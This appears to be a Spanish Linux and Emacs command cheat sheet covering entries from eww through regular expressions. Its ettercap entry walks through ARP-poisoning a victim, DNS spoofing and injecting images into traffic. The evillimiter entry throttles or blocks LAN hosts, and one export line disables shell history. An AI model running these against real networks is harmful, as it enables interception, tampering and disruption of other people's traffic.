Navegador eww [nativo de emacs escrito en elisp y disponible a partir de la versión 24.4]. Se abre con M-x eww. Si el texto ingresado no tiene forma de URL realizará la busqueda en DuckDuckGo.
Algunos atajos:
	q (salir)
	g (recargar la página)
	w (copiar la URL actual al kill ring)
	d (descargar la URL bajo el cursor)
	l (ir  a la página anterior)
	r (ir a la página siguiente)
	H (ver historial de sitios visitados. Se pierde al cerrar eww)
	& (abrir la URL actual en un navegador web externo)
	v (ver código fuente. Se copia en un buffer nuevo y se activa html-mode si está disponible)
28.-
Sincronizar los marcadores de firefox con emacs:
Para guardar los marcadores de firefox al pulsar una combinación de teclas en un fichero org de emacs y, simultaneamente, que el navegador interprete dicho fichero como enlaces clicables precisamos insalar dos plugins en firefox:
     Org capture: http://chadok.info/firefox-org-capture/
     Linkification: http://yellow5.us/firefox/linkification/
Dejar visible la barra de marcadores (View -> Toolbars -> Bookmarks toolbar) y clicar sobre ella con el botón derecho, "Añadir dirección de interes" (Bookmarks toolbar), en "nombre" colocar el que se quiera, yo tengo Org_marcadores y en "ubicación" la ruta en la que queremos guardar el archivo de bookmarks: file:///home/usuario/.emacs.d/org/bookmarks.org o si hemos de sincronizar varios equipos, en dropbox: file:////home/usuario/Dropbox/org/bookmarks.org. Desactivar la casilla "Cargar este marcador en la barra lateral".
Luego, indicar el atajo para guardar los bookmarks en firefox y qué aplicacion usaremos para llamar a emacs:
"Herramientas" -> "Complementos" -> "Org mode capture" -> "Preferéncias", indicar en "emacsclient" la ruta al ejecutable "/usr/bin/emacsclient" y como "hotkey" el valor de "alt-r"
Y para terminar añadir al archivo de configuración .emacs las lineas:
	;;; Bookmarks pulsando M-r en firefox colocará en el archivo mencionado
	;;; la url(%l), pequeña descripción(%c) y fecha(%t)
	(server-start)
	(require 'org-protocol)
	(setq org-capture-templates
	(quote (("f" "Firefox" entry (file "/home/pep/.emacs.d/org/bookmarks.org")
	         "* %l %c %t\n")
	       )))
Un listado de como usar los templates (%l, %c, %t...) en: https://www.gnu.org/software/emacs/manual/html_node/org/Template-expansion.html#Template-expansion
Proceso: Con emacs abierto como servidor o lanzando desde el propio emacs M-x server-start, vamos a firefox y, estando en una página que queremos añadir a marcadores, pulsamos Alt-r. Se abrirá una ventana de emacs preguntando como queremos guardar el link y pulsamos "f" (firefox) ya continuación C-c C-c. Cerramos la ventana. Podemos acceder a los marcadores ya sea desde las direcciones de interés del navegador o desde el archivo .emacs.d/org/bookmarks.org de emacs.
29.-
Algunos notas sobre git: magit
	M-x magit-status (Acceso a magit para activar los siguientes atajos)
	s (Organizar archivos)
	cc (escribir el mensaje del commit. Una vez entrado el texto con C-c C-c para el commit)
	Pu (git push [M-x magit-push-current])
	Fu (git pull [M-x magit-pull-current])
	ll (git log [M-x magit-log-current])
30.-
elfeed, lector de noticias
elfeed-load-opml (Importar un archivo de feeds. El contenido se coloca en el archivo de configuración .emacs)
	G (actualizar fuentes)
	r (Marcar noticia como leída)
	u (Marcar noticia como no leída)
	REF (Abrir noticia en el buffer)
	b (Abrir noticia en el navegador por defecto)
Ejemplo de entradas:
	(setq elfeed-feeds
	  '("http://xiquetam.blogspot.com/feeds/posts/default"
		"http://www.genbeta.com/atom.xml"
		"http://www.linux-party.com/backend.php"
		"http://www.theinquirer.es/feed/atom"
		;; más entradas
		))
Aguardar respuesta del host 30 segundos:
	 (setf url-queue-timeout 30)
Modificar ciertas variables de color si no se visualizan bien:
	  (custom-set-faces
	   '(elfeed-search-date-face ((t (:background "black" :foreground "white"))))
	   '(elfeed-asearch-date-format (quote ("%d-%m-%Y" 10 :left)))
	   '(elfeed-search-feed-face ((t (:background "black" :foreground "white"))))
	   '(elfeed-search-title-face ((t (:background "black" :foreground "white")))))
Aumentar el espació para los titulares. Por defecto 70
	(custom-set-variables
	  '(elfeed-search-title-max-width 130))
31.-
Utilidades de red nativas de emacs (M-x ...)
ifconfig, ipconfig, iwconfig, netstat, arp, route, traceroute, ping, nslookup-host, nslookup, dns-lookup-host, run-dig, dig, ftp, smbclient, smbclient-list-shares, finger, whois y whois-reverse-lookup.
No es necesario ajustes especiales en .emacs, pero puede personalizarse algún aspecto, por ejemplo que ping solo mande 3 paquetes:
	(setq ping-program-options '("-c" "3"))
32.-
impatient-mode
Permite mostrar los contenidos del búfer en una página web que se actualiza automáticamente cuando se realizan cambios.
	M-x httpd-start (Arranca el servidor)
Colocarse en el buffer que quiere compartirse y:
	M-x impatient-mode
En cualquier ordenador de la red se accede al buffer con la dirección: http://IP_o_host:8080/imp/
33.-
Otros ajustes que pueden incorporarse a .emacs precedidas con la explicación comentada:
	;;Mostrar consola al pulsar F5:
	(global-set-key (kbd "<f5>") 'eshell)
	;;Especificar número de espacios en las tabulaciones.
	(setd-default  tab-width  4)
	;;Mostrar reloj y con formato 24 horas
	(setq display-time-24hr-format t)
	(display-time)
	;;Descomprimir archivos.
	(auto-compression-mode t)
	;;Reemplazar "yes" y "no" por "y" y "n" en el prompt.
	(fset 'yes-or-no-p 'y-or-n-p)
	;;Sin copias de seguridad.
	(setq make-backup-files nil)
	;; Embellecer el calendario:
	(setq view-diary-entries-initially t
	mark-diary-entries-in-calendar t
	number-of-diary-entries 7)
	(add-hook 'diary-display-hook 'fancy-diary-display)
	(add-hook 'today-visible-calendar-hook 'calendar-mark-today)
	;; Poner en español el calendario:
	(setq calendar-week-start-day 1
	calendar-day-name-array
    ["Domingo" "Lunes" "Martes"
    "Miercoles" "Jueves" "Viernes" "Sábado"]
    calendar-month-name-array
    ["Enero" "Febrero" "Marzo" "Abril"
    "Mayo" "Junio" "Julio" "Agosto" "Septiembre"
    "Octubre" "Noviembre" "Diciembre"])
	;; Suprimir espacios al final de la linea y lineas en blanco del final:
	(add-hook 'before-save-hook 'delete-trailing-whitespace)
	;; Guardar la sessión al cerrar emacs y restaurarla al arrancar nuevamente:
	;; Colocar a cero [0] para desactivar:
	(desktop-save-mode 1)
	;; Colocar el tipo de sistema
	(defun insert-system-type()
	(interactive)
	(insert (format "%s" system-type)))
	;; Colocar el nombre del sistema
	(defun insert-system-name()
	(interactive)
	(insert (format "%s" system-name)))
	;; Listar y posibilidad de abrir un buffer cerrado anteriormente
	(require 'recentf)
34.-
Uso de algunos paquetes:
lorem-ipsum.- Coloca sentencias o párrafos en un archivo de texto:
C-u 10 M-x lorem-ipsum-insert-paragraphs (Insertar 10 párrafos)
screenshot.- Capturas de pantalla:
M-x screenshot (Pregunta nombre para la captura y scheme (con TAB muestra opciones). Al pulsar C-c C-c el puntero del ratón se convierte en una cruz para seleccionar la zona)
memory-usage.- Muestra estadistica de la memoria usada por emacs
M-x memory-usage


emacs25-common-non-dfsg
Documentación central de Emacs: páginas de información, manual de referencia e introducción a Emacs Lisp. Este paquete contiene la infraestructura, independiente de la arquitectura, que no cumple con las pautas de software libre de Debian. En particular, esto incluye algunas de las páginas de información de GNU Emacs que están cubiertas bajo la licencia GFDL.
$ nano /usr/share/doc/emacs25-common-non-dfsg/README.Debian


emacs-intl-fonts
Paquete que incluye fuentes BDF para imprimir amárico, árabe, cantonés, chino, checo, danés, holandés, esperanto, estonio, finlandés, francés, alemán, griego, hebreo, hindi, italiano, japonés, coreano, maltés, noruego, polaco y ruso. , texto en eslovaco, español, sueco, tailandés, tigrinya, turco y vietnamita como PostScript en mapa de bits.


emerge
Instalador de paquetes de gentoo aunque en realidad, emerge no es en si un instalador de paquetes, si no que se descargan las fuentes y se compilan para nuestro sistema.
# emerge -s paquete (Busca el paquete en el portage)
# emerge paquete (Instala el paquete.
# emerge -p paquete (Muestra las dependencias para instalar el paquete)
# emerge -f paquete (Descarga el paquete pero no lo compila)
# emerge -u paquete (Actualiza el paquete)
# emerge -C paquete (Desinstala el paquete)
# emerge sync (Actualiza el repositorio de paquetes del portage)
# emerge world (Reinstala todo el sistema. No recomendado)
# emerge -u world (Actualiza la distribución)
# emerge -b paquete (Compila el programa, lo instala y nos genera el binario)
# emerge -k paquete (Instala un paquete binario anteriormente compilado)
# emerge -k paquete (Reinstala un paquete del que ya tenemos el binario)
# emerge --update --deep --newuse world (Limpia de paquetes obsoletos)
# emerge –depclean (Continuar con depclean)
# revdep-rebuild (Y terminar. Precisa paquete gentoolkit)
# emerge --update --deep --with-bdeps=y --newuse world (Actualización completa del sistema cuando se ha modificado el /etc/make.conf)
# emerge --update --deep world (Actualizar con las dependencias)
# emerge --resume (Proseguir la compilación despues de pararla con Ctrl + c)


emms
[Emcs Multimedia System]. Reproductor de música propio de emacs. Ver emacs para configuración.
Algunas funciones para emacs:
	emms-play-file (Entrar un archivo para reproducir)
	emms-play-directory (Entrar un directorio)
	emms-play-url (una url)
Atajos básicos:
	s (Stop)
	n (Siguiente canción)
	p (Canción anterior)
	q (Salir)


emms-print-metadata
Imprimirá metadatos sobre archivos de música, para ser usados principalmente por EMMS, el Sistema MultiMedia de Emacs.
$ emms-print-metadata file.mp3


empty
Proporciona una interfaz sencilla para ejecutar y/o interactuar con procesos en sesiones de pseudo-terminales. Esta herramienta es útil en la programación de scripts shell que se utilizan para comunicarse con programas interactivos como telnet o ftp.
$ empty -f -L empty.log telnet localhost (mostrar la salida vacia pero las incidencias en empty.log)
$ empty -l (lista los trabajos creados por la shell)


enable
Permutar la ejecución de un comando de bash como ejecutable interno [por ejemplo: cd] y ejecutable externo [por ejemplo: /bin/cd]. Algunas shells precisan que determinados comandos se ejecuten de forma externa, o sea indicando su ruta al ejecutable. Por defecto un comando siempre se ejecuta de forma interna.
$ enable -a (Ver todos los comandos internos y si están habilitados)
$ enable -n cd (desactiva la ejecución del comando de forma interna)
$ enable cd (lo vuelve a activar)
$ enable -p (lista todos los comandos que se ejecutan internamente)
$ enable -n (muestra los desactivados).


encfs
Encriptar directorios.
# mkdir .cripta cripta  (Crear los directorios)
# encfs /home/usuario/.cripta /home/usuario/cripta (Montarlos especificando la ruta absoluta al directorio /home/usuario.)
La primera vez que lo usemos solicitará si lo configuramos en modo experto [x] , o preconfigurado [p] tecleamos "p" y solicitará la contraseña
# fusermount -u /home/usuario/cripta/ (desmontar el volumen)
# encfsctl passwd /home/usuario/.cripta (cambiar la contraseña)
# encfsctl (Mostrar más opciones)
La siguiente vez que lo montemos solo nos pedirá la contraseña
# encfs /home/usuario/.cripta /home/usuario/cripta
Aunque siempre se trabaje en el directorio /home/usuario/cripta, los datos estarán realmente en /home/usuario/.cripta donde siempre permanecen encriptados en tiempo real. Si intentamos visualizarlos:
# ls /home/usuario/.cripta
Nos da solamente un numeraco: et5bDtRAOe1F5P0crhyOlYYH


enchant-2
Corrector ortográfico
$ enchant-2 -a (modo interartivo que va corrigiendo las frases que se entran por teclado)
$ enchant-2 -l text.txt (enumerar solo las faltas de ortografía)


enchant-lsmod-2
Proporciona información sobre los proveedores del corrector ortográfico de Enchant y los diccionarios que ofrece cada uno.
$ enchant-lsmod-2 (lista los proveedores disponibles)
$ enchant-lsmod-2 -list-dicts (lista todos los diccionarios disponibles)
$ enchant-lsmod-2 -lang es (Muestra qué proveedor y diccionario se utilizará para el idioma indicado)


enscript
Aplicatión que toma archivos ASCII y los convierte a PostScript, HTML o RTF.
$ enscript -J frases -ptexto.ps texto.txt (con título [J] y salida como "texto.ps" sobre el archivo texto.txt)
$ enscript -2 texto.txt (imprimir texto.txt a dos columnas)
$ enscript -B -2r texto.txt (Imprimir texto.txt sin cabecera [B], a dos columnas y hacerlo apaisado)


entropybroker
Infraestructura para distribuir números aleatorios criptográficamente seguros desde uno o más servidores a uno o más clientes. Es un servidor que recolecta datos de entropía desde diferentes clientes. Para utilizar este comando, normalmente se configura el servidor y luego conectar a varios clientes para que envíen datos de entropía al servidor. Consta de los ejecutables: eb_client_egd, eb_client_file, eb_client_kernel_generic, eb_client_linux_kernel, eb_proxy_knuth_b, eb_proxy_knuth_m, eb_server_Araneus_Alea, eb_server_ComScire_R2000KU, eb_server_audio, eb_server_egd, eb_server_ext_proc, eb_server_linux_kernel, eb_server_push_file, eb_server_smartcard, eb_server_stream, eb_server_timers, eb_server_usb, eb_server_v4l y entropy_broker
# entropybroker (iniciar el servidor en el servidor central en el puerto 8080)
Configuración del servidor:
# nano /etc/entropybroker.conf
Con el contenido:
[global]
port = 9000
verbosity = 2
Y luego iniciar el servidor especificando este archivo de configuración:
# entropybroker -f /etc/entropybroker.conf
Los clientes son programas que generan entropía y la envían al servidor.
# entropybroker-client --host <servidor_ip> --port <puerto> (la dirección IP del servidor que ejecuta entropybroker y <puerto> con el puerto que configurado o el predeterminado [8080])
# entropybroker -s (verificar las estadísticas y el estado del servidor que mostrará cuántos clientes están conectados y cuánta entropía está siendo generada y procesada)


env
Muestra las variables de entorno
$ env | grep DISPLAY
Algunas opciones para grep: SHELL, USER, PATH, KEYBOARD, LANG..


envsubst
En el modo de funcionamiento normal, la entrada estándar se copia en la salida estándar y las referencias a las variables de entorno de la forma $VARIABLE o ${VARIABLE} se reemplazan por los valores correspondientes. Si se proporciona SHELL-FORMAT, solo se sustituyen las variables de entorno a las que se hace referencia en SHELL-FORMAT; de lo contrario, se sustituyen todas las referencias de variables de entorno que aparecen en la entrada estándar. Cuando se usa --variables, la entrada estándar se ignora y la salida consta de las variables de entorno a las que se hace referencia en SHELL-FORMAT, una por línea.
Ejemplo
Crear el archivo buendia.txt con el siguiente texto:
$ echo "Hola usuario $USER estás con $DESKTOP_SESSION. Que tengas $BUEN!" > buendia.txt
Exportar la variable y luego lanzar:
  $ export BUEN="buen dia"
  $ envsubst < buendia.txt
  Hola usuario templix estás con LXDE. Que tengas buen dia!
Eliminanos la variable:
  $ unset BUEN
Volvemos a lanzar envsubst
  $ envsubst < buendia.txt
  Hola usuario templix estás con LXDE. Que tengas !


epylog
Analizador syslog que se ejecuta periódicamente. Examina los registros procesando algunas de las entradas para presentarlas en un formato más comprensible. Puede enviar el resultado por correo.
# epylog --last day (del último dia. Otras opciones: "hour" [h], "week" [w], "month" [m])
# epylog --last 2w (de las últimas 2 semanas)
# epylog --cron (ejecutarlo periodicamente)


equivs-build
Es un programa que crea paquetes Debian que pueden usarse para informar a dpkg sobre los paquetes instalados localmente y sus dependencias. También con equivs se pueden crear paquetes vacíos que sólo requieren otros paquetes. Éstos pueden usarse como paquetes de "perfil" que sólo marcan a otros para su instalación. Por favor, tenga en cuenta que este es un hack rudimentario y que si se usa irreflexivamente, podría dañar su sistema de empaquetado. Tenga en cuenta también que no es la forma recomendada de tratar con dependencias rotas. Mejor envíe un informe de error


epubcheck
Herramienta para validar archivos EPUB quep puede detectar muchos tipos de errores.
$ epubcheck archivo.epub (forma básica)
$ epubcheck -l (lista los mensajes y los niveles de gravedad)
$ epubcheck --out archivo archivo.epub (guarda el informe en archivo en xml)
$ epubcheck -e -w archivo.epub (solo muestra mensajes de gravedad, error y advertencia en la salida)


errno
[moreutils]. Muestra los errores de código y sus descripciones.
$ errno -l (Todo el listado)
$ errno -s desconocido (Busca del listado el que contenga la descripción "desconocido")


es2_info
[= es2_info.x86_64-linux-gnu]. Muestra información sobre las extensiones OpenGL ES soportadas.
$ es2_info


escputil
Ver nivel de tinta de las impresoras Epson
# escputil -i -u -r /dev/usblp0 (Para ver niveles de tinta)
# escputil -c -u -r /dev/usblp0 (Limpiar cabezales)
# escputil -n -u -r /dev/usblp0 (Imprimir prueba de inyestores)
# escputil -h -u -r /dev/usblp0 (Listar comandos y opciones)


esetroot
[eterm-utils]. Configura el fondo de Eterm para transparencia con administradores de ventanas distintos a Enlightenment. kEsetroot se proporciona para KDE.
$ esetroot -s /home/usuario/imagenes/imagen.jpg (Escala al tamaño de la pantalla)
$ esetroot -b red -f /home/usuario/imagenes/imagen-jpg (Colorea en rojo la parte de la pantalla no ocupada por la imágen con la opción -f)
otras opciones:
      -c (Centrar la imagen)
      -f (Respetando las proporciones)
      -m (en mosaico)


espeak
Hablando la terminal. Mismas opciones que aoss espeak.
$ echo {1..3}" sistemas quedaron y naturalmente eran linux  " | espeak -ves -s 100


et
[Eternal Terminal]. Shell remoto, que a diferencia de una sesión normal ssh, aunque se tenga un cambio de ip o un corte de red, se vuelve a conectar automáticamente sin interrumpir la sesión. En debian, añadir a /etc/apt/sources.list la linea:
	deb https://mistertea.github.io/debian-et/debian-source/ stretch main
Y añadir la clave:
# curl -sS https://mistertea.github.io/debian-et/et.gpg | sudo apt-key add -
Instalar con el clásico:
# apt install et


eterm
[eterm-utils]. Emulador de terminal en color diseñado por y para Enlightenment. Este terminal es altamente configurable y dispone de una gran cantidad de temas disponibles. Su gran característica principal son las transparencias. eterm-utils dispone de varios ejecutables que todos se lanzan con la primera letra en mayúscula: Esetroot [ver] y kEsetroot para kde, Etbg [establece la imagen de fondo de Eterm], Etbg_update_list [actualiza listas de mapas de píxeles para los menús], Etcolors [muestra una tabla del mapa de colores actual], Etsearch [busca en el historial del búfer hacia atrás] y Ettable [muestra el conjunto de caracteres de la fuente actual].
$ Eterm -D 1 -f green -O (En el segundo escritorio [-D 1] con las fuentes en verde  [-f]  y transparente [-O]
Algunas opciones:
	--buttonbar false (Sin la barra del menú)
	-T “titulo de la terminal”
	-b yellow (color de fondo)
	-c red (Color del cursor)
	-g 50x10 (Medidas. 50 de largo por 10 de ancho)
	-S (Abrir en todos los escritorios)
	-e comando (Cuando termine de ejecutar el comando se cierra)


etherwake
Arrancar un ordenador [especificado por su MAC] de forma remota una vez activado en la BIOS "Wake On Lan"
# etherwake -i eth0 00:16:E6:31:1A:22


ethstats
muestra el uso y las estadísticas de nuestra red.
# ethstats


ethstatus
Monitor de estadísticas de internet
# ethstatus


ethtool
Averiguar/modificar la tarjeta de red
# ethtool eth0  (Para ver la configuración actual de la tarjeta)
# ethtool -i eth0  (conocer el driver de la tarjeta de red)
# ethtool --test eth0 (Realizar un test de la tarjeta si está soportado)
# ethtool -S eth0 (Consultar estadísticas de la red)
# ethtool -p eth0 10 (Hacer parpadear los lets de la interfaz de red)


ethumb
Programa que crea miniaturas a partir de imágenes del fichero.
$ ethumb -f=png archivo.pdf (crear un thumbnail de un pdf en png)
$ ethumb -p=3 -f=png archivo.pdf (tomando como imagen la página 3)


ettercap
[Dependencias: libcap2 libnet1 zlib1g libpthread-stubs0 libpcre3-dev libpcap-dev libcap-dev libnet6-1.3-0 libnet1-dev libssl-dev ncurses-bin libncurses5-dev libsdl-pango1 libatk1.0-dev]
Snifador de red. Muestra pantallas solicitando aceptación de certificado en los navegadores de las victimas.
descargar de http://ettercap.sourceforge.net/ y descomprimir
$ wget http://prdownloads.sourceforge.net/ettercap/ettercap-NG-0.7.3.tar.gz?download
$ wget http://sourceforge.net/projects/ettercap/files/ettercap/NG-0.7.3/ettercap-NG-0.7.3.tar.gz/download
$ tar -zvxf paquete
$ cd ettercap-NG-0.7.3
	$ ./configure
	$ make
	# make install
$ ettercap -P list   (visualizar plugins instalados)
modificar archivo de configuración:
# nano /etc/etter.conf
descomentar la linea:himne20-01-13 19:37Menos información
# if you use iptables:
redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
Y modificar:
# the command used by the remote_browser plugin
remote_browser = "firefox -remote openurl(http://%host%url)"
Para usar el plugin dns_spoof (Redireccionar páginas a otros sitios)
# nano /usr/share/ettercap/etter.dns
# 3  Modos de especificar la redirección a localhost
	microsoft.com          A       192.168.1.2
	*.microsoft.com        A       192.168.1.2
	*google*               A       192.168.1.2
Para la sustitución de imagenes:
# touch test2filter
Pegar:
	if (ip.proto == TCP && tcp.src == 80) {
	replace("img src=", "img src=\"http://www.irongeek.com/images/jollypwn.png\" ");
	replace("IMG SRC=", "img src=\"http://www.irongeek.com/images/jollypwn.png\" ");
	msg("Filter ok.\n");
Configurar el sistema para que acepte todos los paquetes que detecte. Si al lanzar:
# cat /proc/sys/net/ipv4/ip_forward
Si la respuesta no es 1, lanzar:
# echo 1 > /proc/sys/net/ipv4/ip_forward
Arrancar la aplicación en ncurses [en terminal -> ettercap -T , en modo gtk -> ettercap -G y en modo demonio -> ettercap -D . En este último caso el análisis se realiza en los archivos de log]:
# ettercap -C
Clicar en:
	Sniff -> Unifield sniffing
Y aceptar [o poner] la red [eth0]. En la nueva pantalla, clic en:
	Host -> Scan for host
Para escanear la red. Para visionar las máquina activas obtenidas, clic en:
	Hosts -> Hosts List
Bajar con el cursor hasta la IP del router y pulsar la tecla "1". Luego nos situamos sobre la IP del objetivo y pulsar la tecla "2" con lo que colocamos nuestra máquina entre el router y la máquina objetivo (envenenamiento arp). Luego en el cuadro que se abre con:
	Mitm -> Arp poisoning
Parameters, ponemos:
	remote
Y arrancamos el sniffer:
	Start -> Start sniffing
	Para observar las conexiones que realiza la máquina objetivo:
	View -> Connections
	Para terminar el ataque:
	Mitm -> Stop mitm atack
	Start -> Stop Sniffing
	Start -> Exit
Forma abreviada:
	# ettercap -Tq -M arp:remote -i eth0 ip_victima ip_router
	O solo especificando la del router si se ataca toda la red:
# ettercap -Tq -M arp:remote -i eth0 ip_router


eval
Toma los argumentos de la línea de comandos y los ejecuta como comandos.
* Tenemos un texto con variables:
$ nano entrada_web.txt
	Hola $NOMBRE, felices de verte por la web $BLOG
Y un script con el siguiente contenido:
	#!/bin/bash
	echo "¿Como te llamas? "
	read NOMBRE
	BLOG="lapipaplena.net"
	eval "echo "$(cat ./entrada_web.txt)""
* Substituiendo las variables del script en el texto.
Otro ejemplo de uso de eval:
$ nano ejemplo.sh
	#!/bin/bash
	pipe="/ |"
	#ls $pipe wc -l
	eval ls $pipe wc -l
Descomentar la linea del "ls" y comentar la de "eval" y observar la diferencia entre ambas salidas.
* Otro ejemplo:
$ nano ejemplo.sh
	#!/bin/bash
	X=10
	Y=X
	#echo '$'$Y
	eval echo '$'$Y
Descomentar la linea del "echo" y comentar la de "eval" y observar la diferencia entre ambas salidas.


evillimiter
Análisis de la red local.
Descarga e instalación:
	$ git clone https://github.com/bitbrute/evillimiter.git
	$ cd evillimiter
	# python3 setup.py install
# evillimiter (entrar en el prompt de la aplicación)
(Main) >>> ? (muestra la ayuda)
(Main) >>> scan (escaner toda la red)
(Main) >>> scan --range 192.168.1.1-192.168.1.50 (escanear un rango de la red)
(Main) >>> scan --range 192.168.1.1/24
(Main) >>> hosts (ver los resultados del scan con la columna ID)
(Main) >>> limit 0,3 300kbit (Limita velocidad de las máquinas con ID 0 i 3 a 300kbits)
(Main) >>> limit all 1gbit (Limita la velocidad de todas las máquinas de la red a 1gbit))
(Main) >>> block 2 (Bloquea la máquina 2)
(Main) >>> free 2 (Libera el bloqueo de la máquina 2)
(Main) >>> free all (Libera todas las máquinas bloqueadas)
(Main) >>> clear (Limpiar la terminal)
(Main) >>> quit (Salir de la aplicación)


evince
Visor de documentos capaz de mostrar documentos en formatos múltiples y paginados como PDFs y Postscripts.
$ evince -s archivo.pdf (en modo presentación)
$ evince -p 5 archivo.pdf (abrir la página 5 del pdf)


evince-previewer
Mostrar vista previa de impresión para documentos PostScript y PDF.
$ evince-previewer archivo.pdf


exa
Lista el contenido de un directorio de forma mejorada respecto al comando "ls" escrito en rust, coloreando de distintos tipos los archivos, metadatos, atributos, enlace simbólicos, git...
$ exa (forma básica)
$ exa -T (de forma recursiva en forma de arbol)
$ exa -R (de forma recursiva)
$ exa -D (muestra el listado de directorios)
$ exa -l (mostrando los metadatos de forma extendida)
$ exa -l archivo (información de un fichero especifico)
$ exa -x (como el comando ls pero más coloreado)
$ exa -F (clasifica el listado según tipo de archivo [* = ejecutable, .../ = directorio, @ = enlace...])
$ exa -a (mostrando archivos ocultos)
$ exa -G -l /var (información de un  directorio concreto y en varias columnas)
$ exa -a --group-directories-first (el listado que empiece por los directorios)
$ exa -G -l --octal-permissions /etc (incluir loa permisos en octal)
$ exa -R -s size (de forma recursiva y ordenar por tamaño)


exec
Ejecuta comandos.
$ exec firefox


exif
Extraer metadatos de imagenes
$ exif -d imagen  (mostrar todos los datos)
$ exif -e imagen  (extraer la foto miniatura)
$ exif -r imagen   (suprimir la foto miniatura)
Nota.- Cuando se toma una iamgen con una cámara fotográfica, esperamos que la imagen resultante tenga la misma orientación que pretendíamos. Esto significa que las imágenes de paisajes se muestran horizontalmente y las imágenes de retratos se muestran verticalmente en la pantalla. Pero, ¿cómo sabe la computadora (o la cámara) cómo se ha tomado una imagen?. La mayoría de los formatos de imagen contienen no solo el contenido, sino también información adicional sobre el contenido: los metadatos de la imagen. El formato de imagen JPEG puede contener metadatos EXIF [Exchangeable Image File Format], entre otras cosas como la lente, el modelo de cámara y la orientación de la imagen.
La orientación canónica es 1. Un valor de orientación de 1 significa que el contenido de la imagen existe exactamente en la forma en que queremos verlo en la pantalla. Supongamos que tenemos una cámara de fotos cuyo sensor tiene una relación de aspecto de 4:3. Cuando usamos la cámara para tomar una imagen en orientación horizontal, la imagen JPEG resultante tendrá un valor de orientación de 1. Sin embargo, cuando disparamos en modo retrato, los sensores de la cámara notan que la orientación ha cambiado. Los metadatos EXIF de la imagen resultante tendrán un valor de orientación de 8, si la cámara se giró en el sentido de las agujas del reloj, o 6, si la cámara se giró en el sentido contrario a las agujas del reloj. Asimismo, 3 es la orientación correspondiente para imágenes de paisajes al revés.
Hay casos en los que la cámara produce una imagen invertida, debido a restricciones del hardware de la cámara o a defectos del firmware. Por este motivo, existen otros cuatro valores de orientación posibles, Herramientas como exifautotran [ver] o ImageMagick permiten normalizar la orientación de las imágenes.


exifautotran
Transforma los metadatos exif referentes a la orientación [vertical, horizontal ...] de una lista archivos Exif [ver nota exif] para que la orientación sea 1.
$ exifautotran file1 file2 file3


exiftags
Muestra los datos exif de un jpg.
$ exiftags foto.jpg


exiftool
Lee y extrae metadatos de imágenes
$ exiftool -a -u -g1 foto.png
$ exiftool -GPSAltitude="0/1" foto.jpg  (Añadir tags a una imagen)
$ exiftool -GPSLatitude="41.403339" foto.jpg
$ exiftool -GPSLatitudeRef="N" foto.jpg
$ exiftool -GPSLongitude="2.1740288" foto.jpg
$ exiftool -GPSLongitudeRef="E" foto.jpg
$ exiftool -TagsFromFile imagen_datos.jpg imagenFinal.jpg (Copia los datos Exif de la foto "imagen_datos.jpg" a la foto "imagenFinal.jpg")


exim
Agente de transporte de correo.
$ exim -bp (Lista los correos en cola)
$ exim -bpc (Muestra la cantidad de correos en cola)
$ exim -bp | exiqsumm (Muestra resumen de los correos en cola)
$ exim -Mrm 1X62E1-0006CU-61 (Eliminar un correo concreto por su ID)
$ exim -Mf 1X62E1-0006CU-61 (Congelar un correo)
$ exim -M 1X62E1-0006CU-61 (Procesar un correo)
$ exiqgrep -z -i | xargs exim -Mrm (Eliminar todos los correos congelados)
$ exiwhat (Mostrar qué está haciendo exim en este momento)
$ exim -bt 1X62E1-0006CU-61 (Hacer un traceroute a una dirección de correo)
$ exim -Mvh 1X62E1-0006CU-61 (Ver cabeceras de un correo)
$ exim -Mvb 1X62E1-0006CU-61 (Ver el cuerpo de un correo)
$ exim -Mvl 1X62E1-0006CU-61 (Ver los logs de un correo)
$ exim -qff (Forzar cola de correo)


exit
Salir del interprete de comandos.


exo-open
Abrir urls o aplicaciones determinadas en XFCE.
$ exo-open --launch TerminalEmulator (abrir la terminal)
$ exo-open URL (abrir la url con el navegador predeterminado)
$ exo-open --launch FileManager (el navegador de archivos)


expand
Convierte los tabuladores a espacios. Elimina las tabulaciones y los remplaza por espacios en blanco. Por defecto las tabulaciones son de 8 espacios en blanco.
$ expand -t 5 texto.txt (Convierte las tabulaciones en 5 espacios en blanco)
$ expand -i -t 5 texto.txt (Sólo afecta a las tabulaciones de principio de linea)


expiry
Chequea cuando caducan las contraseñas de usuario [si son temporales]
$ expiry -c


expect
Herramienta para automatizar aplicaciones interactivas (telnet, ftp, passwd, fsck, rlogin, tip, etc) de acuerdo con un script.


export
Exporta, almacena y lista variables. Para que los cambios sean permanentes, colocar la linea en .bashrc.
$ export -p (mostrar todas las variables)
# export PATH=${PATH}:/usr/local/bin   (incluir un dir en el path)
$ export TMOUT=60 (Establece 60 segundos de inactividad antes de cerrar una sesión ssh)
$ export HISTCONTROL=”ignoreboth:erasedups” (no escribir en el history ni los comandos que empiecen por espacio, ni los duplicados y que además los elimine, dejando siempre el último)
Opciones para HISTCONTROL:
ignorespace: No guarda en history los comandos que empiecen por espacio.
	ignoredups: No guarda los comandos repetidos.
	ignoreboth: Alias para los dos parámetros anteriores.
	erasedups: Elimina los comandos duplicados dejando el último ejecutado.
$ export HISTFILE=/home/usuario/histfile.txt (redirigir los comandos ejecutados durante una sesión a un archivo)
$ export HISTFILE=/dev/null (Para no guardar el history de la sesión)
$ export HISTFILE=/dev/null bash (abrir otra sesión que no almacene los comandos sin perder los de la actual)
$ export PS1="[\u@`curl icanhazip.com` \W]$ "  (Excentricidad: que el promt diga la ip externa.)
$ export LANG=C; gedit (Lanzar una aplicación con un locale concreto)


expr
Permite realizar operaciones aritméticas.
$ expr 2 + 3
$ expr 2 \* 3 (Para la multiplicación ha de anteponerse al signo la barra \)
$ expr 12 / 2
$ sum=`expr 5 + 3`; expr $sum \* 2 (Enlazar operaciones)


expresiones-regulares
[regex o patrones]. Buscar cadenas de texto que coinciden con un patrón. Los comandos más usuales que las emplean son grep, find, sed y awk y cada uno con sus pecualiaridades. Para ilustrar dichas expresiones se usa un archivo de texto al que llamo file.
$ cat file
	# /etc/fstab: static file system information.
	UUID=de1d7793-c3d2-4e03-b79d-1a76905619e6 /               ext4    errors=remount-ro 0       1
	UUID=ccc71238-d89d-435b-a4e2-c2d836f800bb none            swap    sw              0       0
	/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0
	/dev/sda5       /media/datos    ext4    defaults        0       0
	/dev/sda7       /media/fotos    ext3    defaults        0       0
	servidor:/home/templix /media/servidor  nfs4 defaults   0       0
	### Otras cosas
	7592 esto es un número....
